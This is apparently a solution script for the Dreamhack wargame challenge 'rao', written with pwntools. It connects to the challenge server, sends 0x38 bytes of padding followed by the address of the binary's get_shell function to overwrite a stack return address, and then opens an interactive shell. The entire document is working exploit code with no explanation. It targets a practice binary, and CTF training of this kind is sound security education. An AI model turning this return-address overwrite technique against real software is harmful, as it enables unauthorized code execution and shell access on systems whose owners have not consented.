from pwn import *

p = remote("host3.dreamhack.games",24132)
e = ELF('./rao')

get_shell = e.symbols['get_shell']

payload = b''
payload += b'a' * 0x38
payload += p64(get_shell)

p.sendline(payload)

p.interactive()